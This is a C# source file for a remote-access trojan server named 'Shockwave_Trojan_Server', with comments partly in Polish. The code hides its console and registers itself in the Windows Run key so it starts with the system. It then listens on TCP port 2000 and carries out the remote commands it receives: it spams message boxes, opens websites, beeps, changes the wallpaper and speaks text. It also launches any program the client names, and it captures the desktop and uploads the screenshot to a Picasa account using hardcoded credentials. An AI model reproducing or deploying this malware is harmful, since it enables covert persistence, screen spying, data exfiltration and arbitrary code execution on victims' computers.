using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.IO;
using Microsoft.Win32;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Speech.Synthesis;
using System.Drawing;
using System.Drawing.Imaging;
using Google.GData.Photos;
using Google.GData.Client;
using Google.GData.Extensions;
using Google.GData.Extensions.Location;


namespace Shockwave_Trojan_Server
{
    class Program
    {   
        public static NetworkStream Receiver;
        
        [DllImport("Kernel32.dll")]
        

        public static extern bool FreeConsole();

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        

        //We'll run this on another thread so the CPU doesn't go haywire.

        public static void Receive()
		{
			//Infinite loop

			while (true)
			{

				//Try to read the data.

				try
			   
				{
					//Packet of the received data

					byte[] RecPacket = new byte[1000];

					//Read a command from the client.

					Receiver.Read(RecPacket, 0, RecPacket.Length);

					//Flush the receiver

					Receiver.Flush();

					//Convert the packet into a readable string

					string Command = Encoding.ASCII.GetString(RecPacket);

					//Split the command into two different strings based on the splitter we made, ---

                    string[] CommandArray = System.Text.RegularExpressions.Regex.Split(Command, "---");

                    //Get the actual command.

					Command = CommandArray[0];

					//A switch which does a certain thing based on the received command

					switch (Command)
					{

						//Code for "MESSAGE"

						case "MESSAGE":
							string Msg = CommandArray[1];
                            string ile1 = CommandArray[2];
                            for (int i = 0; i < Convert.ToInt32(ile1); i++)
                            {
                                //Display the message in a messagebox (the trim removes any excess data received :D)
                                MessageBox.Show(Msg.Trim('\0'));
                            }
							break;

						case "OPENSITE":

							//Get the website URL

							string Site = CommandArray[1];

							//Open the site using Internet Explorer
                            string ile2 = CommandArray[2];
                            for (int i = 0; i < Convert.ToInt32(ile2); i++)
                            {
                                System.Diagnostics.Process IE = new System.Diagnostics.Process();

                                IE.StartInfo.FileName = "iexplore.exe";

                                IE.StartInfo.Arguments = Site.Trim('\0');

                                IE.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized;

                                IE.Start();
                            }
							break;

                        case "BEEP":
                            string czas = CommandArray[1];
                            for (int i = 0; i <Convert.ToInt32(czas); i++)
                            {
                                Console.Beep(5000, 100);
                                Console.Beep(100, 300);
                                Console.Beep(1000, 100);
                                Console.Beep(500, 300);
                                Console.Beep(3000, 500);
                                Console.Beep(500, 100);
                                Console.Beep(1000, 100);

                            }
                            break;

                        case "TAPETA":
                            string lokalizacja = CommandArray[1];
                            {
                                //SetWallpaper(openGraphic.FileName, 2, 0);
                                int Result;
                                string bmp_path = lokalizacja;
                                Result = SystemParametersInfo(20, 0, bmp_path, 0x1 | 0x2);
                            }
                            break;

                        case "MOW":
                            string tekst = CommandArray[1];
                            string ile4 = CommandArray[2];                          
                            for (int i = 0; i < Convert.ToInt32(ile4); i++)
                            {
                                SpeechSynthesizer speaker = new SpeechSynthesizer();
                                speaker.Rate = 1;
                                speaker.Volume = 100;
                                speaker.Speak(tekst);
                            }
                            break;
                             
                        case "SCREEN":
                            string data = DateTime.Now.ToShortDateString();
                            string godzina = DateTime.Now.ToString("HH.mm.ss");
                            string plik = data + "Godzina." + godzina + "s.jpeg";                        
                            {                                      
                                //Funkcja robi screenshota
                                ScreenCapture sc = new ScreenCapture();
                                sc.CaptureScreenToFile( plik ,ImageFormat.Jpeg);

                                ///Funkcja uploadująca na serwer picassy
                                PicasaService service = new PicasaService("exampleCo-exampleApp-1");
                                service.setUserCredentials("Trojan.cSharp", "trojanc#");

                                System.IO.FileInfo fileInfo = new System.IO.FileInfo(plik);
                                System.IO.FileStream fileStream = fileInfo.OpenRead();

                                PicasaEntry entry = (PicasaEntry)service.Insert(new Uri("https://picasaweb.google.com/data/feed/api/user/default/albumid/default"), fileStream, "image/jpeg", plik);
                                fileStream.Close();
                            }
                            break;

 

                        default:
                            string ile3 = CommandArray[1];
                            for (int i = 0; i < Convert.ToInt32(ile3); i++)
                            {
                                System.Diagnostics.Process proces = new System.Diagnostics.Process();
                                proces.StartInfo.FileName = Command;
                                proces.Start();
                            }
                            break;
					}

				}
				catch
				{
				   
					//Stop reading data and close

					break;
				}

			}
		}


        public enum Style : int
        {
            Tiled, Centered, Stretched
        }

       
        
        static void Main(string[] args)
        {

                //Hide console

                FreeConsole();


   
                //Dodawanie do autostartu
                Boolean Startup = true;
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                if (Startup == true)
                {
                    key.SetValue("Application Name", Application.ExecutablePath.ToString());
                }

                //Listen for client connection
                TcpListener l = new TcpListener(2000);
                l.Start();

                while (true)
                {

                    //Wait for client to connect, then make a TcpClient to accept the connection

                    TcpClient Connection = l.AcceptTcpClient();

                    //Get Connection's stream.

                    Receiver = Connection.GetStream();

                    //Start the receive commands thread

                    System.Threading.Thread Rec = new System.Threading.Thread(new System.Threading.ThreadStart(Receive));

                    Rec.Start();
                }

        }
                    public class ScreenCapture
                    {
                        /// ROBIENIE SCREENSHOTÓW
                        /// <summary>
                        /// Creates an Image object containing a screen shot of the entire desktop
                        /// </summary>
                        /// <returns></returns>
                        public Image CaptureScreen()
                        {
                            return CaptureWindow( User32.GetDesktopWindow() );
                        }
                        /// <summary>
                        /// Creates an Image object containing a screen shot of a specific window
                        /// </summary>
                        /// <param name="handle">The handle to the window. (In windows forms, this is obtained by the Handle property)</param>
                        /// <returns></returns>
                        public Image CaptureWindow(IntPtr handle)
                        {
                            // get te hDC of the target window
                            IntPtr hdcSrc = User32.GetWindowDC(handle);
                            // get the size
                            User32.RECT windowRect = new User32.RECT();
                            User32.GetWindowRect(handle,ref windowRect);
                            int width = windowRect.right - windowRect.left;
                            int height = windowRect.bottom - windowRect.top;
                            // create a device context we can copy to
                            IntPtr hdcDest = GDI32.CreateCompatibleDC(hdcSrc);
                            // create a bitmap we can copy it to,
                            // using GetDeviceCaps to get the width/height
                            IntPtr hBitmap = GDI32.CreateCompatibleBitmap(hdcSrc,width,height);
                            // select the bitmap object
                            IntPtr hOld = GDI32.SelectObject(hdcDest,hBitmap);
                            // bitblt over
                            GDI32.BitBlt(hdcDest,0,0,width,height,hdcSrc,0,0,GDI32.SRCCOPY);
                            // restore selection
                            GDI32.SelectObject(hdcDest,hOld);
                            // clean up
                            GDI32.DeleteDC(hdcDest);
                            User32.ReleaseDC(handle,hdcSrc);
                            // get a .NET image object for it
                            Image img = Image.FromHbitmap(hBitmap);
                            // free up the Bitmap object
                            GDI32.DeleteObject(hBitmap);
                            return img;
                        }
                        /// <summary>
                        /// Captures a screen shot of a specific window, and saves it to a file
                        /// </summary>
                        /// <param name="handle"></param>
                        /// <param name="filename"></param>
                        /// <param name="format"></param>
                        public void CaptureWindowToFile(IntPtr handle, string filename, ImageFormat format)
                        {
                            Image img = CaptureWindow(handle);
                            img.Save(filename,format);
                        }
                        /// <summary>
                        /// Captures a screen shot of the entire desktop, and saves it to a file
                        /// </summary>
                        /// <param name="filename"></param>
                        /// <param name="format"></param>
                        public void CaptureScreenToFile(string filename, ImageFormat format)
                        {
                            Image img = CaptureScreen();
                            img.Save(filename,format);
                        }
                     
                        /// <summary>
                        /// Helper class containing Gdi32 API functions
                        /// </summary>
                        private class GDI32
                        {
                           
                            public const int SRCCOPY = 0x00CC0020; // BitBlt dwRop parameter
                            [DllImport("gdi32.dll")]
                            public static extern bool BitBlt(IntPtr hObject,int nXDest,int nYDest,
                                int nWidth,int nHeight,IntPtr hObjectSource,
                                int nXSrc,int nYSrc,int dwRop);
                            [DllImport("gdi32.dll")]
                            public static extern IntPtr CreateCompatibleBitmap(IntPtr hDC,int nWidth,
                                int nHeight);
                            [DllImport("gdi32.dll")]
                            public static extern IntPtr CreateCompatibleDC(IntPtr hDC);
                            [DllImport("gdi32.dll")]
                            public static extern bool DeleteDC(IntPtr hDC);
                            [DllImport("gdi32.dll")]
                            public static extern bool DeleteObject(IntPtr hObject);
                            [DllImport("gdi32.dll")]
                            public static extern IntPtr SelectObject(IntPtr hDC,IntPtr hObject);
                        }

                        /// <summary>
                        /// Helper class containing User32 API functions
                        /// </summary>
                        private class User32
                        {
                            [StructLayout(LayoutKind.Sequential)]
                            public struct RECT
                            {
                                public int left;
                                public int top;
                                public int right;
                                public int bottom;
                            }
                            [DllImport("user32.dll")]
                            public static extern IntPtr GetDesktopWindow();
                            [DllImport("user32.dll")]
                            public static extern IntPtr GetWindowDC(IntPtr hWnd);
                            [DllImport("user32.dll")]
                            public static extern IntPtr ReleaseDC(IntPtr hWnd,IntPtr hDC);
                            [DllImport("user32.dll")]
                            public static extern IntPtr GetWindowRect(IntPtr hWnd,ref RECT rect);
                        }
                    }


        



    }
}